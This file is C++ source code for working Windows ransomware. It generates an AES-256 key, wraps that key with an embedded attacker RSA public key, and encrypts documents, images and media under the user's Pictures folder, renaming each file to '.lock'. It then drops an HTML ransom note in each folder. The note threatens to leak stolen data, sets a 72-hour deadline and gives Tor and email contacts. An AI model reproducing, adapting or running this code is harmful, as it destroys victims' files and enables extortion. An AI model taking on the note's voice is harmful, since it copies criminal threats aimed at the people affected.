#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <Wincrypt.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <comdef.h>
#include <thread>
#include <Lmcons.h>

#pragma comment(lib, "Crypt32.lib")
using namespace std;

void handleError(const char*);
void lockFolder(const std::string& path, HCRYPTKEY hKey, DWORD blockSize);
void locker(const std::string&, HCRYPTKEY, DWORD);
BOOL InitiateCryptor();
BOOL lockKey(std::string, HCRYPTPROV, HCRYPTKEY);
bool checkExtension(std::string);
std::string byteToHex(BYTE*, DWORD);
BOOL SetupNote(std::string);
void leaveNote(std::string);
wstring StringToWString(const std::string&);
string bstr_to_str(BSTR);
std::string GetPicturesFolder();

DWORD blockSize = NULL;
HCRYPTKEY hKey = NULL;
HCRYPTPROV hCryptProv = NULL;
std::string lockerNote = "Locker Note";
std::vector<std::thread> workers;

void handleError(const char* message)
{
    cerr << message << " error code: " << GetLastError() << endl;
    exit(-1);
}

std::string byteToHex(BYTE* inputBytes, DWORD inputSize)
{
    std::string outputString;
    DWORD hexSize = 0;
    if (!CryptBinaryToStringA(inputBytes, inputSize, CRYPT_STRING_HEX, NULL, &hexSize))
    {
        // handle error
        handleError("Failed to get size of encrypted bytes key");
        return NULL;
    }

    outputString.resize(hexSize, '\0');
    if (!CryptBinaryToStringA(inputBytes, inputSize, CRYPT_STRING_HEX, &outputString[0], &hexSize))
    {
        // handle error
        handleError("Failed to convert encrypted bytes key to Hex Format");
        return NULL;
    }
    //outputString.resize(base64Size - 1); // remove null terminator
    return outputString;
}

void leaveNote(std::string path)
{
    std::ofstream outfile(path+"\\how_to_back_files.html");
    if (outfile) {

        outfile << lockerNote;
        outfile.close();
        //std::cout << "File written successfully\n";
        //ransome_notes.push_back("Ransome Note Left: " + path + "\\how_to_back_files.html");
    }
    else {
        //std::cerr << "Error: Unable to open file\n";
    }    
}

BOOL SetupNote(std::string personal_id)
{
    lockerNote = R"(<html>
    <style type="text/css">
      body {
      background-color: #f5f5f5;
      }
h1, h3{
  text-align:  center;
  text-transform: uppercase;
  font-weight: normal;
/*---*/
.tabs1{
    display: block;
    margin: auto;
.tabs1 .head{
    text-align: center;
    float: top;
    padding: 0px;
    text-transform: uppercase;
    font-weight: normal;
    display: block;
    background: #81bef7;
    color: #DF0101;
    font-size: 30px;
.tabs1 .identi {
    font-size: 10px;
    text-align:  center;
    float: top;
    padding: 15px;
    display: block;
    background: #81bef7;
    color: #DFDFDF;
    word-break: break-all;
.tabs .content {
  background: #f5f5f5;
  /*text-align: center;*/
  color: #000000;
  padding: 25px 15px;
  font-size: 15px;
  font-weight: 400;
  line-height: 20px; }
 .tabs .content a {
    color: #df0130;
    font-size: 23px;
    font-style: italic;
    text-decoration: none;
    line-height: 35px; }
.tabs .content .text{
padding: 25px;
line-height: 1.2;
    </style>
  <body>
    <div class="tabs1">
     <div class="head" ><b>Your personal ID: <br></b></div>
      <div class="identi">
      <span style="width:1000px; color: #ffffff; font-size: 10px;">{{IDENTIFIER}}</span> <br>
<!-- !!! dont changing this !!! -->
      </div>
    </div>
  <!-- -->
    <div class="tabs">
<!--tab-->  
    <div class="tab">
        <div id="tab-content1" class="content">
         
          <div class="text">
          <!--text data -->
          <b>/!\ YOUR COMPANY NETWORK HAS BEEN PENETRATED /!\</b><br>
          <b>All your important files have been encrypted!</b><br><br>
	  <hr>
             Your files are safe! Only modified. (RSA+AES)<br><br>
ANY ATTEMPT TO RESTORE YOUR FILES WITH THIRD-PARTY SOFTWARE<br>
WILL PERMANENTLY CORRUPT IT.<br>
DO NOT MODIFY ENCRYPTED FILES.<br>
DO NOT RENAME ENCRYPTED FILES.<br><br>
No software available on internet can help you. We are the only ones able to<br>
solve your problem.<br><br>
We gathered highly confidential/personal data. These data are currently stored on<br>
a private server. This server will be immediately destroyed after your payment.<br>
If you decide to not pay, we will release your data to public or re-seller.<br>
So you can expect your data to be publicly available in the near future..<br><br>
We only seek money and our goal is not to damage your reputation or prevent<br>
your business from running.<br><br>
You will can send us 2-3 non-important files and we will decrypt it for free<br>
to prove we are able to give your files back.<br><br>
          <!--text data -->
          <hr>
          <b>Contact us for price and get decryption software.</b><br><br>
<a>qd7pcafnc***********************************************.onion</a><br>
* Note that this server is available via Tor browser only<br><br>
Follow the instructions to open the link:<br>
              1. Type the addres "https://www.torproject.org" in your Internet browser. It opens the Tor site.<br>
              2. Press "Download Tor", then press "Download Tor Browser Bundle", install and run it.<br>
              3. Now you have Tor browser. In the Tor Browser open <a>qd7pcafnc***********************************************.onion<br>
          </a>
                        4. Start a chat and follow the further instructions. <br>
          <hr>			
          <b>If you can not use the above link, use the email:</b><br>
          <a href="ithel***@******.cyou  ">ithel***@******.cyou    </a> <br>
          <a href="ithe****@who******.business ">ithe****@who******.business   </a> <br>
          
          
          <p>* To contact us, create a new free email account on the site:  <a href="https://protonmail.com">protonmail.com <br>
IF YOU DON'T CONTACT US WITHIN 72 HOURS, PRICE WILL BE HIGHER.</b><br>
          </div>
        </div>
    </div>
 <!--tab-->    
            
          <!--text data -->
          </div> 
        </div>
<!--tab--> 
    </div>
    
  </div>
  </body>
</html>)";

    // Find position of identifier
    size_t startPos = lockerNote.find("{{IDENTIFIER}}");
    if (startPos != std::string::npos) {

        //replace color
        lockerNote.replace(startPos - 27, 7, "#FF0000");

        //replace font
        lockerNote.replace(startPos - 7, 4, "20px");

        lockerNote.replace(startPos, 14, personal_id); //"{{IDENTIFIER}}" is 14 characters long
        return true;
    }
    return false;
}

wstring StringToWString(const std::string& str)
{
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    wchar_t* buffer = new wchar_t[size];
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, buffer, size);
    wstring result(buffer);
    delete[] buffer;
    return result;
}

bool checkExtension(std::string fileName)
{
    // Define the list of allowed extensions
    string allowedExtensions[] = { ".txt", ".docx", ".pdf", ".jpg", ".mp3", ".docm", ".mp4", ".png", ".pptx", ".xlsx", ".pptm", ".xlsm", ".jpeg"};
    int numExtensions = 13;

    // Extract the file extension
    string extension = fileName.substr(fileName.find_last_of("."));

    // Compare the extension with the allowed extensions
    for (int i = 0; i < numExtensions; i++) {
        if (extension == allowedExtensions[i]) {
            return true;
        }
    }
    return false;
}

void lockFolder(const std::string& path, HCRYPTKEY hKey, DWORD blockSize)
{
    std::string search_path = path + "\\*.*";
    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile(StringToWString(search_path).c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to find first file: " << path << std::endl;
        return;
    }

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(_bstr_t(fd.cFileName), ".") != 0 && strcmp(_bstr_t(fd.cFileName), "..") != 0) {
                // Recursively iterate subdirectory

                wstring ws(fd.cFileName);
                std::string str(ws.begin(), ws.end());

                std::string sub_path = path + "\\" + str;
                
                //lockFolder(sub_path, hKey, blockSize);
                // Launching different threads for every subdirectory
                workers.emplace_back(lockFolder, sub_path, hKey, blockSize);
                leaveNote(sub_path);
            }
        }
        else {
            // File found, print path
            std::string fileName = bstr_to_str(_bstr_t(fd.cFileName));
            std::string str = path + "\\" + fileName;

            if (checkExtension(fileName))
            {
                std::cout << "Encrypting file: " << str << std::endl;
                locker(str, hKey, blockSize);
            }
            else
            {
                continue;
            }
        }
    } while (FindNextFile(hFind, &fd) != 0);
    FindClose(hFind);
}

string bstr_to_str(BSTR source) {
    //source = L"lol2inside";
    _bstr_t wrapped_bstr = _bstr_t(source);
    int length = wrapped_bstr.length();
    char* char_array = new char[length];
    strcpy_s(char_array, length + 1, wrapped_bstr);
    return char_array;
}

void locker(const std::string& inputFile,HCRYPTKEY hKey, DWORD blockSize)
{
    std::string outputFile = inputFile + ".lock";
    // Open the input file
    ifstream fin(inputFile, ios::binary | ios::ate);
    if (!fin.is_open()) {
        cerr << "Failed to open input file" << endl;
        return;
    }

    streampos size = fin.tellg();
    vector<char> data(size);
    fin.seekg(0, ios::beg);
    fin.read(data.data(), size);
    fin.close();

    // Encrypt the data
    DWORD encryptedDataSize = static_cast<DWORD>(size) + (blockSize / 8);
    vector<BYTE> encryptedData(encryptedDataSize);
    memcpy(encryptedData.data(), data.data(), size);

    DWORD dwSize = static_cast<DWORD>(size);
    if (!CryptEncrypt(hKey, NULL, TRUE, 0, encryptedData.data(), &dwSize, encryptedDataSize)) {
        cerr << "Failed to encrypt data" << endl;
        return;
    }

    // Write the encrypted data to the output file
    ofstream fout(inputFile, ios::binary);
    if (!fout.is_open()) {
        cerr << "Failed to open output file" << endl;
        return;
    }

    if (!fout.write(reinterpret_cast<char*>(encryptedData.data()), dwSize))
    {
        cerr << "Failed to write encrypted file" << endl;
        return;
    }
    //fout.write(reinterpret_cast<char*>(encryptedData.data()), dwSize);
    fout.close();

    //rename encrypted file to add extension
    rename(inputFile.c_str(), outputFile.c_str());
}

BOOL lockKey(std::string publickey, HCRYPTPROV hCryptProv, HCRYPTKEY hKey)
{
    // Uses the attacker's public key to encrypt the current session AES-256 key and saves it in ransome note
    // Import public key from string

    // Generate bytes from Base64 string
    std::vector<BYTE> publicKeyBytes;
    DWORD publicKeySize = 0;
    if (!CryptStringToBinaryA(publickey.c_str(), 0, CRYPT_STRING_BASE64, NULL, &publicKeySize, NULL, NULL)) {
        CryptReleaseContext(hCryptProv, 0);
        handleError("Error getting binary size");
    }
    publicKeyBytes.resize(publicKeySize);
    if (!CryptStringToBinaryA(publickey.c_str(), 0, CRYPT_STRING_BASE64, publicKeyBytes.data(), &publicKeySize, NULL, NULL)) {
        CryptReleaseContext(hCryptProv, 0);
        handleError("Error converting to binary");
    }

    HCRYPTKEY phKey = NULL;
    if (!CryptImportKey(hCryptProv, publicKeyBytes.data(), publicKeySize, 0, 0, &phKey)) {
        CryptDestroyKey(phKey);
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        handleError("Error importing key");
    }

    //Export AES key for encrypting it with attacker's public key
    //Determine the size of the buffer needed for the exported key
    DWORD dwBufSizeAES = 0;
    if (!CryptExportKey(hKey, NULL, PLAINTEXTKEYBLOB, NULL, NULL, &dwBufSizeAES))
    {
        CryptDestroyKey(phKey);
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        handleError("Error determining key buffer size");
    }

    // Allocate a buffer for the exported key
    //BYTE* pbAesKey = new BYTE[dwBufSizeAES];
    //memset(pbAesKey, 0, dwBufSizeAES);
    std::vector<BYTE> pbAesKey(dwBufSizeAES, 0);

    // Export the key to the buffer
    if (!CryptExportKey(hKey, NULL, PLAINTEXTKEYBLOB, NULL, pbAesKey.data(), &dwBufSizeAES))
    {
        CryptDestroyKey(phKey);
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        handleError("Error exporting key");
    }

    //Encrypt AES key with RSA public key
    //Determine the size of the buffer needed for the encrypted key
    DWORD dwBufSize = 0;
    if (!CryptEncrypt(phKey, NULL, TRUE, 0, NULL, &dwBufSize, 0))
    {
        CryptDestroyKey(phKey);
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        handleError("Error determining encrypted buffer size");
    }

    //PBYTE pbEncryptedKey = (PBYTE)malloc(dwBufSize);
    std::vector<BYTE> pbEncryptedKey(dwBufSize, 0);

    // Encrypt the AES key with RSA-OAEP padding
    memcpy(pbEncryptedKey.data(), pbAesKey.data(), dwBufSize);
    if (!CryptEncrypt(phKey, NULL, TRUE, 0, pbEncryptedKey.data(), &dwBufSizeAES, dwBufSize))
    {
        CryptDestroyKey(phKey);
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        handleError("Error encrypting AES key");
    }

    // Now pbEncryptedKey contains the encrypted AES key
    std::string hexEncryptedKey = byteToHex(pbEncryptedKey.data(), dwBufSizeAES);

    //cout << "Encrypted AES Key Bytes: \n" << hexEncryptedKey << endl;
    CryptDestroyKey(phKey);
    if (SetupNote(hexEncryptedKey))
    {
        std::cout << "[x] Ransom Note Created" << std::endl;
        return true;
    }
    return false;
}

BOOL InitiateCryptor()
{
    //Attacker's publickey
    std::string publickey = "BgIAAACkAABSU0ExAAgAAAEAAQCV9LvY1+a2rVQQKmHIYxXwltivcgEVoGHGSlKiHlpscysu4TFFZjGnMZGNZWTRb7nMG3dbHsF+AtpEqANZtrFEa7qB93oCcKf2tekVmX8LvN3iaucvPjMyGmt9pVa/t7B4lrASmVHYi0srzzdQ8TkIc26mzHrr++ZWx3RMQbz+6Elsifb2Z1fwTdpnQUJ4Otq5pxlzifT2tsB8jMTJv59N7owqCYivCq9bToZrfUdmnX+2shzyaAe6axPaVArV/j2/iRk83i2piMda86GD87AryP5fTYApA2cCP2hicRWHNCFBJW5hne5doonZ9y2gn509GMxYv9qAhB2x8a9i8p6X";

    // Generate an AES-256 session key for encrypting files
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        handleError("Failed to acquire cryptographic context");
    }
    if (!CryptGenKey(hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey)) {
        CryptReleaseContext(hCryptProv, 0);
        handleError("Failed to generate key");
    }
    // Get the block size for the algorithm;
    DWORD dwDataLen = sizeof(DWORD);
    if (!CryptGetKeyParam(hKey, KP_BLOCKLEN, (BYTE*)&blockSize, &dwDataLen, 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        handleError("Failed to get block size");
    }

    // Encrypt the AES-256 session key with attacker's public key
    if (lockKey(publickey, hCryptProv, hKey))
    {
        std::cout << "[x] Encryption Key Locked" << std::endl;
        return true;
    }
    return false;
}

std::string GetPicturesFolder()
{
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);
    std::string convert(username);
    std::string combined_path = "C:\\users\\" + convert + "\\Pictures";
    return combined_path;
}

int main(int argc, char* argv[])
{
    try
    {
        if (InitiateCryptor())
        {
            std::cout << "[x] Crypter Initiated Successfully" << std::endl;

            // Establishing Lock Folder with Recusive Encryptor. i.e {Pictures folder}
            // Everything in the Pictures folder will be encrypted
            lockFolder(GetPicturesFolder(), hKey, blockSize);

            // Join all the threads
            for (auto& t : workers) {
                t.join();
            }

            CryptDestroyKey(hKey);
            CryptReleaseContext(hCryptProv, 0);
        }
    }
    catch (int e)
    {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
        
        handleError("Exception occured!");
    }
    return 0;
}
